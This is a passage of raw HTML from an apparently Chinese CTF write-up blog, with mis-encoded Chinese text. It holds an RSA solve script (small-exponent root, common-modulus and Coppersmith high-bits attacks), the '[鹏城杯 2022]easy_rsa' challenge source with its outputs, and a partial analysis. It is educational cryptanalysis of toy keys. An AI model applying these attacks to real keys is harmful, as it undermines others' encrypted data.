reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.8641079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mathnormal mtight">e</span><span class="mord mtight">3</span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.0126em;vertical-align:-0.26630799999999993em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.746292em;"><span style="top:-2.433692em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span><span style="top:-3.1449em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.26630799999999993em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></span></p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰éƒ¨åˆ†"></a> ç¬¬ä¸‰éƒ¨åˆ†</h3><p>æˆ‘ä»¬çŸ¥é“pçš„é«˜312ä½ï¼Œåˆ©ç”¨coppersmithè¿›è¡Œé«˜ä½æ”»å‡»</p><p>(å¯ä»¥ç›´æ¥å½“æ¿å­é¢˜)</p><h2 id="exp-15"><a class="markdownIt-Anchor" href="#exp-15"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes,bytes_to_long,getPrime<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><br>c1=<span class="hljs-number">19105765285510667553313898813498220212421177527647187802549913914263968945493144633390670605116251064550364704789358830072133349108808799075021540479815182657667763617178044110939458834654922540704196330451979349353031578518479199454480458137984734402248011464467312753683234543319955893</span><br>e1=<span class="hljs-number">3</span><br>n1=<span class="hljs-number">12381447039455059836328051884891454693813773102677797588584673367249449397570306976005386747183624947329082879996258685589268590290205063001831293901056494567669971224624982034171215593839806873286664642282661947718043485814893823566209248205899907910545013618168514189595557454867166732016774164107233025900</span><br><br>msg1=long_to_bytes(iroot(c1,e1)[<span class="hljs-number">0</span>])<br><br><br>c22=<span class="hljs-number">54995751387258798791895413216172284653407054079765769704170763023830130981480272943338445245689293729308200574217959018462512790523622252479258419498858307898118907076773470253533344877959508766285730509067829684427375759345623701605997067135659404296663877453758701010726561824951602615501078818914410959610</span><br>c23=<span class="hljs-number">91290935267458356541959327381220067466104890455391103989639822855753797805354139741959957951983943146108552762756444475545250343766798220348240377590112854890482375744876016191773471853704014735936608436210153669829454288199838827646402742554134017280213707222338496271289894681312606239512924842845268366950</span><br>e2=<span class="hljs-number">17</span><br>n2=<span class="hljs-number">111381961169589927896512557754289420474877632607334685306667977794938824018345795836303161492076539375959731633270626091498843936401996648820451019811592594528673182109109991384472979198906744569181673282663323892346854520052840694924830064546269187849702880332522636682366270177489467478933966884097824069977</span><br>e3=<span class="hljs-number">65537</span><br><br>_,s1,s2=gcdext(e2,e3)<br>msg2=long_to_bytes(<span class="hljs-built_in">int</span>((<span class="hljs-built_in">pow</span>(c22,s1,n2)*<span class="hljs-built_in">pow</span>(c23,s2,n2))%n2))<br><br>c3=<span class="hljs-number">59213696442373765895948702611659756779813897653022080905635545636905434038306468935283962686059037461940227618715695875589055593696352594630107082714757036815875497138523738695066811985036315624927897081153190329636864005133757096991035607918106529151451834369442313673849563635248465014289409374291381429646</span><br>n3=<span class="hljs-number">113432930155033263769270712825121761080813952100666693606866355917116416984149165507231925180593860836255402950358327422447359200689537217528547623691586008952619063846801829802637448874451228957635707553980210685985215887107300416969549087293746310593988908287181025770739538992559714587375763131132963783147</span><br>high_p=<span class="hljs-number">7117286695925472918001071846973900342640107770214858928188419765628151478620236042882657992902</span><br>unknown_bits=<span class="hljs-number">200</span><br>high_p=high_p&lt;&lt;unknown_bits<br>R.&lt;x&gt; = PolynomialRing(Zmod(n3))<br>f = high_p + x<br>x = f.small_roots(X = <span class="hljs-number">2</span>^unknown_bits,beta = <span class="hljs-number">0.4</span>)<br>p=<span class="hljs-built_in">int</span>(high_p+x[<span class="hljs-number">0</span>])<br>msg3=long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c3,invert(e3,(p-<span class="hljs-number">1</span>)*(n3//p-<span class="hljs-number">1</span>)),n3)))<br><br>text=msg1+msg2+msg3<br><span class="hljs-built_in">print</span>(text)<br><span class="hljs-built_in">print</span>(md5(text).hexdigest())<br><span class="hljs-comment">#b&quot; \nO wild West Wind, thou breath of Autumn&#x27;s being,\nThou, from whose unseen presence the leaves dead\nAre driven, like ghosts from an enchanter fleeing,\nYellow, and black, and pale, and hectic red,\nPestilence-stricken multitudes: O thou,\nWho chariotest to their dark wintry bed\n&quot;</span><br><span class="hljs-comment">#3943e8843a19149497956901e5d98639</span><br><span class="hljs-comment">#NSSCTF&#123;3943e8843a19149497956901e5d98639&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é¹åŸæ¯-2022easy_rsa"><a class="markdownIt-Anchor" href="#é¹åŸæ¯-2022easy_rsa"></a> [é¹åŸæ¯ 2022]easy_rsa</h1><h2 id="é¢˜ç›®-16"><a class="markdownIt-Anchor" href="#é¢˜ç›®-16"></a> é¢˜ç›®</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> flag<br><br>m1 = flag[<span class="hljs-number">0</span>:<span class="hljs-number">12</span>]<br>m2 = flag[<span class="hljs-number">12</span>:<span class="hljs-number">24</span>]<br>m3 = flag[<span class="hljs-number">24</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt1</span>(<span class="hljs-params">m</span>):<br>    <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>        e = random.randint(<span class="hljs-number">100</span>, <span class="hljs-number">1000</span>)<br>        p = getPrime(<span class="hljs-number">1024</span>)<br>        q = getPrime(<span class="hljs-number">1024</span>)<br>        phi_n = (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>)<br>        t = gmpy2.gcd(e, phi_n)<br>        <span class="hljs-keyword">if</span> gmpy2.invert(e // t, phi_n) <span class="hljs-keyword">and</span> t != <span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">break</span><br>    n = p * q<br>    c = <span class="hljs-built_in">pow</span>(m, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-built_in">format</span>(p, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;q&#x27;</span>: <span class="hljs-built_in">format</span>(q, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt2</span>(<span class="hljs-params">m</span>):<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    c = gmpy2.powmod(m, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;p&#x27;</span>: <span class="hljs-built_in">format</span>((p &gt;&gt; <span class="hljs-number">60</span>) &lt;&lt; <span class="hljs-number">60</span>, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;e&#x27;</span>: <span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-built_in">format</span>(n, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt3</span>(<span class="hljs-params">m</span>):<br>    p = getPrime(<span class="hljs-number">1024</span>)<br>    q = getPrime(<span class="hljs-number">1024</span>)<br>    n = p * q<br>    e = <span class="hljs-number">65537</span><br>    M = <span class="hljs-number">2022</span> * m * <span class="hljs-number">1011</span> * p<br>    c = <span class="hljs-built_in">pow</span>(M, e, n)<br>    <span class="hljs-built_in">print</span>(&#123;<span class="hljs-string">&#x27;c&#x27;</span>: <span class="hljs-built_in">format</span>(c, <span class="hljs-string">&#x27;x&#x27;</span>), <span class="hljs-string">&#x27;n&#x27;</span>: <span class="hljs-built_in">format</span>(n, <span class="hljs-string">&#x27;x&#x27;</span>),<span class="hljs-string">&#x27;e&#x27;</span>:<span class="hljs-built_in">format</span>(e, <span class="hljs-string">&#x27;x&#x27;</span>)&#125;)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    encrypt1(bytes_to_long(m1))<br>    encrypt2(bytes_to_long(m2))<br>    encrypt3(bytes_to_long(m3))<br><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e&#x27;, &#x27;p&#x27;: &#x27;bb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd&#x27;, &#x27;q&#x27;: &#x27;bb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1&#x27;, &#x27;e&#x27;: &#x27;292&#x27;&#125;</span><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f&#x27;, &#x27;p&#x27;: &#x27;a9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000&#x27;, &#x27;e&#x27;: &#x27;10001&#x27;, &#x27;n&#x27;: &#x27;841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65&#x27;&#125;</span><br><span class="hljs-comment"># &#123;&#x27;c&#x27;: &#x27;1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df&#x27;, &#x27;n&#x27;: &#x27;c2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069&#x27;, &#x27;e&#x27;: &#x27;10001&#x27;&#125;</span><br><br></code></pre></td></tr></table></figure><h2 id="åˆ†æ-16"><a class="markdownIt-Anchor" href="#åˆ†æ-16"></a> åˆ†æ</h2><p>å°†flagåˆ†æˆäº†ä¸‰ä¸ªéƒ¨åˆ†ï¼Œä¸€ä¸€æ¥çœ‹</p><h3 id="ç¬¬ä¸€éƒ¨åˆ†-2"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€éƒ¨åˆ†-2"></a> ç¬¬ä¸€éƒ¨åˆ†</h3><p>ç»™äº†på’Œqï¼Œä½†æ˜¯ç»è¿‡è®¡ç®—eå’Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\phi(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>å¹¶ä¸äº’ç´ </p><p>ä½†æ˜¯æœ€å¤§å…¬çº¦æ•°æ˜¯2</p><p>æˆ‘ä»¬è®¡ç®—e//2ï¼Œå½“ä½œæ–°çš„eæ¥è§£å¯†ï¼Œæœ€åæ±‚è§£å‡ºæ¥å¼€2æ¬¡æ ¹å°±ç»“æœäº†</p><p>è¯æ˜ï¼š</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi>c</mi><mo>=</mo><msup><mi>m</mi><mi>e</mi></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mi>e</mi><mo>=</mo><mn>2</mn><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mspace linebreak="newline"></mspace><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>Ï•</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msup><mi>c</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></msup><mo>=</mo><msup><mi>m</mi><mrow><mi>e</mi><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mrow></msup><mo>=</mo><msup><mi>m</mi><mrow><mn>2</mn><msup><mi>e</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup><msup><mi>d</mi><mo mathvariant="normal" lspace="0em" rspace="0em">â€²</mo></msup></mrow></msup><mo>=</mo><msup><mi>m</mi><mn>2</mn></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">c=m^e\quad mod(n)\\e=2e&#x27;\\d&#x27;e&#x27;=1\quad mod(\phi(n)\\c^{d&#x27;}=m^{ed&#x27;}=m^{2e&#x27;d&#x27;}=m^2\quad mod(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">c</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">e</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord">2</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.801892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.801892em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">c</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">â€²</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.99248em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.99248em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8278285714285715em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord 